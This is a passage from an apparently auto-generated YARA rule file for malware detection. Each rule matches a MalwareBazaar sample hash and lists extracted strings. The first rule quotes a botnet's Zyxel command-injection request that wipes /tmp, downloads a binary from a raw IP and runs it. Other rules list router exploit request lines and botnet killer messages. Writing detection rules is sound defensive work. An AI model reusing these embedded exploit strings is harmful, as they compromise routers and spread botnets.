        $s16 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s17 = "No such file or directory"
        $s18 = "No such process"
        $s19 = "Interrupted system call"
        $s20 = "Bad file descriptor"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 151KB and
        all of them
}

rule Windows_6a244c788077dae0c56075ef30f10720953d8183a9caad1bba548224a053bfa7
{
    meta:
        description = "Auto ML: 6a244c788077dae0c56075ef30f10720953d8183a9caad1bba548224a053bfa7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GetMax8"
        $s5 = "<Module>"
        $s6 = "get_teamID"
        $s7 = "set_teamID"
        $s8 = "get_agentID"
        $s9 = "set_agentID"
        $s10 = "ConnectAPI"
        $s11 = "get_data"
        $s12 = "set_data"
        $s13 = "System.Collections.Generic"
        $s14 = "add_Load"
        $s15 = "frm_main_Load"
        $s16 = "frm_map_Load"
        $s17 = "get_Checked"
        $s18 = "set_Checked"
        $s19 = "set_Enabled"
        $s20 = "get_tiled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 647KB and
        all of them
}

rule Linux_6a310e25d2181dcc4e96f9bcdef2017c448c6942e07baeb617da865ac6e5006b
{
    meta:
        description = "Auto ML: 6a310e25d2181dcc4e96f9bcdef2017c448c6942e07baeb617da865ac6e5006b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GETv"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "http"
        $s5 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s6 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_6a39b6b391dc78eec218057c201e7bc33085d5e8722346b347547ee8bca6ceb5
{
    meta:
        description = "Auto ML: 6a39b6b391dc78eec218057c201e7bc33085d5e8722346b347547ee8bca6ceb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6255KB and
        all of them
}

rule Windows_6a4a7355b992673eecda83e99103ddd832d993ba1e66521a36f69a9d38ce5418
{
    meta:
        description = "Auto ML: 6a4a7355b992673eecda83e99103ddd832d993ba1e66521a36f69a9d38ce5418"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB and
        all of them
}

rule Windows_6a546d75556d9fec84c5a82dcafe0dbca854020ff13e3292c0e9b1efc5cca2a4
{
    meta:
        description = "Auto ML: 6a546d75556d9fec84c5a82dcafe0dbca854020ff13e3292c0e9b1efc5cca2a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "basis_for_modeling_and_calculations.exe"
        $s13 = "<Module>"
        $s14 = "MySettings"
        $s15 = "ApplicationSettingsBase"
        $s16 = "System.Configuration"
        $s17 = "MySettingsProperty"
        $s18 = "System.Windows.Forms"
        $s19 = "<Module>{BD02B7DD-4824-45BF-9AD8-F79ED0E494D8}"
        $s20 = "Unicom.Uniworks.CModule.BaseForm"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5329KB and
        all of them
}

rule Linux_099e14ef118090e2c477c47b199cd5ba0d7977b5b4bb62071453011f5cf56eec
{
    meta:
        description = "Auto ML: 099e14ef118090e2c477c47b199cd5ba0d7977b5b4bb62071453011f5cf56eec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 130KB and
        all of them
}

rule Linux_6a7ea8868a2726330ee53f618167f6a4fbac20be141b4f600ae53731eb846bdc
{
    meta:
        description = "Auto ML: 6a7ea8868a2726330ee53f618167f6a4fbac20be141b4f600ae53731eb846bdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Windows_6a861eb0176a0f7e0c4d69f2a65856d739bd4829448e72add40fabb9bf439634
{
    meta:
        description = "Auto ML: 6a861eb0176a0f7e0c4d69f2a65856d739bd4829448e72add40fabb9bf439634"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "SetFileSecurityW"
        $s13 = "RegOpenKeyExW"
        $s14 = "RegCreateKeyExW"
        $s15 = "ADVAPI32.dll"
        $s16 = "SHFileOperationW"
        $s17 = "SHGetFileInfoW"
        $s18 = "SHGetPathFromIDListW"
        $s19 = "ShellExecuteExW"
        $s20 = "SHGetSpecialFolderLocation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 624KB and
        all of them
}

rule Windows_6a8764f48723b273ce89f68cd92e5346cd72c8fb859d409b2907837c70c52d01
{
    meta:
        description = "Auto ML: 6a8764f48723b273ce89f68cd92e5346cd72c8fb859d409b2907837c70c52d01"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_6ab25b50183214c0349b233d73b6fe1ba1d8b0dff45ffe2a5b6161da468147d1
{
    meta:
        description = "Auto ML: 6ab25b50183214c0349b233d73b6fe1ba1d8b0dff45ffe2a5b6161da468147d1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "NanoCore Client.exe"
        $s6 = "System.Windows.Forms"
        $s7 = "System"
        $s8 = "System.Drawing"
        $s9 = "kernel32.dll"
        $s10 = "psapi.dll"
        $s11 = "advapi32.dll"
        $s12 = "ntdll.dll"
        $s13 = "dnsapi.dll"
        $s14 = "ClientLoaderForm.resources"
        $s15 = "User"
        $s16 = "Microsoft.VisualBasic.CompilerServices"
        $s17 = "StandardModuleAttribute"
        $s18 = "HideModuleNameAttribute"
        $s19 = "Registry"
        $s20 = "Microsoft.Win32"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Linux_6ac22a2ffff11e63d6ff1b8c08d5fcff2e12ef16e4a72c17a52adef74e9766e0
{
    meta:
        description = "Auto ML: 6ac22a2ffff11e63d6ff1b8c08d5fcff2e12ef16e4a72c17a52adef74e9766e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 77KB and
        all of them
}

rule Linux_6aee5a31455e929c7a8a33b8104a474ba88eff9aba68de5886294ca520d820a5
{
    meta:
        description = "Auto ML: 6aee5a31455e929c7a8a33b8104a474ba88eff9aba68de5886294ca520d820a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "cmdline"
        $s4 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s5 = "/proc/%s/cmdline"
        $s6 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s7 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s9 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s10 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s11 = "systemd"
        $s12 = "http"
        $s13 = "(deleted)"
        $s14 = "/proc/self/cmdline"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB and
        all of them
}

rule Linux_6afdae2d4e26961412850f7ded79b40919e043b3d1a82ba2afa454c59bd9505a
{
    meta:
        description = "Auto ML: 6afdae2d4e26961412850f7ded79b40919e043b3d1a82ba2afa454c59bd9505a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 60KB and
        all of them
}

rule Windows_6b05772e39ea7ae4c3396fbedc1e5a462db3cd611be8548f452b2ec19f1581c0
{
    meta:
        description = "Auto ML: 6b05772e39ea7ae4c3396fbedc1e5a462db3cd611be8548f452b2ec19f1581c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2543KB and
        all of them
}

rule Windows_6b6aa6f3eafabe7135d78cc7dc61bfbbef60854ee7d64790da42aedcfc996dbb
{
    meta:
        description = "Auto ML: 6b6aa6f3eafabe7135d78cc7dc61bfbbef60854ee7d64790da42aedcfc996dbb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "&XwiNK"
        $s5 = "XwiNKirT"
        $s6 = "XwiN"
        $s7 = "XwiNaP"
        $s8 = "setWI"
        $s9 = "seTL-x"
        $s10 = "7ZPsetB$-"
        $s11 = "<Module>"
        $s12 = "get_OpenPDF"
        $s13 = "get_ImageURL"
        $s14 = "set_ImageURL"
        $s15 = "System.IO"
        $s16 = "System.Windows.Media"
        $s17 = "OpenGitHub"
        $s18 = "System.Collections.Generic"
        $s19 = "connectionId"
        $s20 = "dllToLoad"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1032KB and
        all of them
}

rule Windows_6b8e428cff996c49aa52e017213c7016880a2bc1583d051240c74992bf83c357
{
    meta:
        description = "Auto ML: 6b8e428cff996c49aa52e017213c7016880a2bc1583d051240c74992bf83c357"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "system"
        $s7 = "no such process"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "not a socket"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 427KB and
        all of them
}

rule Windows_09ceeefd3297e4ec6e500bb98bc0c8472f0e995834cba8a9673eeafd26117cff
{
    meta:
        description = "Auto ML: 09ceeefd3297e4ec6e500bb98bc0c8472f0e995834cba8a9673eeafd26117cff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "DownloadData"
        $s7 = "File"
        $s8 = "set_FileName"
        $s9 = "GetRandomFileName"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "set_UseShellExecute"
        $s13 = "VisualStudio.exe"
        $s14 = "System.Runtime.Versioning"
        $s15 = "DownloadString"
        $s16 = "GetTempPath"
        $s17 = "OperatingSystem"
        $s18 = "get_OSVersion"
        $s19 = "get_Version"
        $s20 = "System.Reflection"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 54KB and
        all of them
}

rule Windows_6b9698cd2668202190045c9a635e89e4fbd72ecf63d1484f05f92f724fcdd440
{
    meta:
        description = "Auto ML: 6b9698cd2668202190045c9a635e89e4fbd72ecf63d1484f05f92f724fcdd440"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "SetUnhandledExceptionFilter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB and
        all of them
}

rule Linux_6b9a43948a22157bf3ae9d78e67f0bc96f8a7a418c22702be2026685a61c9d7c
{
    meta:
        description = "Auto ML: 6b9a43948a22157bf3ae9d78e67f0bc96f8a7a418c22702be2026685a61c9d7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB and
        all of them
}

rule Windows_6b9a6412f2be50608dcca1f79b749a9b8f9b61c0576dd8ae2e2e724227530e12
{
    meta:
        description = "Auto ML: 6b9a6412f2be50608dcca1f79b749a9b8f9b61c0576dd8ae2e2e724227530e12"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"
        $s6 = "B.rsrc"
        $s7 = "System"
        $s8 = "kernel32.dll"
        $s9 = "GetLongPathNameA"
        $s10 = "Windows"
        $s11 = "TFileName"
        $s12 = "TThreadLocalCounter"
        $s13 = "$TMultiReadExclusiveWriteSynchronizer"
        $s14 = "TModuleInfo"
        $s15 = "GetDiskFreeSpaceExA"
        $s16 = "oleaut32.dll"
        $s17 = "VariantChangeTypeEx"
        $s18 = "EVariantArrayCreateError"
        $s19 = "bdRightToLeftReadingOnly"
        $s20 = "EFileStreamError"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 503KB and
        all of them
}

rule Windows_6bca1f55e5acc5b3c5d3848ef558c5e1b5a64ccb6041f3f2c7430dd46fd90f7c
{
    meta:
        description = "Auto ML: 6bca1f55e5acc5b3c5d3848ef558c5e1b5a64ccb6041f3f2c7430dd46fd90f7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Error opening archive %s"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 18098KB and
        all of them
}

rule Windows_6c0ac1e5fa97f92b6acc9594fa33513cb11849f3a1588ec95834b4fe650c08eb
{
    meta:
        description = "Auto ML: 6c0ac1e5fa97f92b6acc9594fa33513cb11849f3a1588ec95834b4fe650c08eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_AOjb"
        $s6 = "System.Collections.Generic"
        $s7 = "Load"
        $s8 = "set_FormattingEnabled"
        $s9 = "set_Handled"
        $s10 = "get_Elapsed"
        $s11 = "set_AutoScaleMode"
        $s12 = "GetTypeFromHandle"
        $s13 = "set_Name"
        $s14 = "GetType"
        $s15 = "get_Culture"
        $s16 = "set_Culture"
        $s17 = "ApplicationSettingsBase"
        $s18 = "STAThreadAttribute"
        $s19 = "DebuggerNonUserCodeAttribute"
        $s20 = "TargetFrameworkAttribute"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 651KB and
        all of them
}

rule Linux_6c264bfd4594fa8fecef25dcc55dff4e4063fa3985428ac5492700defe50239c
{
    meta:
        description = "Auto ML: 6c264bfd4594fa8fecef25dcc55dff4e4063fa3985428ac5492700defe50239c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB and
        all of them
}

rule Windows_6c3029ca3f035f3dbaaf4f692d4788536ce21d3fe2bab7927b0d55bd87413678
{
    meta:
        description = "Auto ML: 6c3029ca3f035f3dbaaf4f692d4788536ce21d3fe2bab7927b0d55bd87413678"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_6c523ef93416b140bba0a146cec6fdfd44d95db5505b913fc5d2837dffe8f5fb
{
    meta:
        description = "Auto ML: 6c523ef93416b140bba0a146cec6fdfd44d95db5505b913fc5d2837dffe8f5fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "Stub.exe"
        $s6 = "System.Windows.Forms"
        $s7 = "System"
        $s8 = "System.Drawing"
        $s9 = "user32"
        $s10 = "winmm.dll"
        $s11 = "kernel32"
        $s12 = "user32.dll"
        $s13 = "avicap32.dll"
        $s14 = "Kernel32.dll"
        $s15 = "<Module>"
        $s16 = "System.ComponentModel"
        $s17 = "System.CodeDom.Compiler"
        $s18 = "System.Diagnostics"
        $s19 = "m_UserObjectProvider"
        $s20 = "User"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 43KB and
        all of them
}

rule Windows_6c5eea2d93dc13108a6020ae7f0bf6f432d0c99ddae8edbc4ed56557c497bf91
{
    meta:
        description = "Auto ML: 6c5eea2d93dc13108a6020ae7f0bf6f432d0c99ddae8edbc4ed56557c497bf91"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "WINbq"
        $s6 = "CorExitProcess"
        $s7 = "FlsSetValue"
        $s8 = "FlsGetValue"
        $s9 = "An application has made an attempt to load the C runtime library incorrectly."
        $s10 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s11 = "- Attempt to initialize the CRT more than once."
        $s12 = "- unable to open console device"
        $s13 = "- unexpected multithread lock error"
        $s14 = "- not enough space for thread data"
        $s15 = "- floating point support not loaded"
        $s16 = "GAIsProcessorFeaturePresent"
        $s17 = "KERNEL32"
        $s18 = "GetProcessWindowStation"
        $s19 = "GetUserObjectInformationA"
        $s20 = "GetLastActivePopup"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 227KB and
        all of them
}

rule Windows_6d037779c2fc7194e31211c125d34c62cf379746c99ba315d6f183bfcb393623
{
    meta:
        description = "Auto ML: 6d037779c2fc7194e31211c125d34c62cf379746c99ba315d6f183bfcb393623"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "RegSetValueExA"
        $s7 = "GetModuleFileNameW"
        $s8 = "GetProcAddress"
        $s9 = "LoadLibraryA"
        $s10 = "MWin"
        $s11 = "rgeT"
        $s12 = "Gy8y+ecMD"
        $s13 = "GetProcessWindowStation"
        $s14 = "GetLastError"
        $s15 = "ExitProcess"
        $s16 = "SetClipboardData"
        $s17 = "SHELL32.dll"
        $s18 = "SetProcessAffinityMask"
        $s19 = "KERNEL32.dll"
        $s20 = "GetProcessAffinityMask"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5390KB and
        all of them
}

rule Windows_0a293a8447e1dfbf22376fccd39d3e5fc2218059ea59cc2c401264b457708cf3
{
    meta:
        description = "Auto ML: 0a293a8447e1dfbf22376fccd39d3e5fc2218059ea59cc2c401264b457708cf3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetStdHandle"
        $s7 = "GetUserDefaultLCID"
        $s8 = "RegCloseKey"
        $s9 = "ExitProcess"
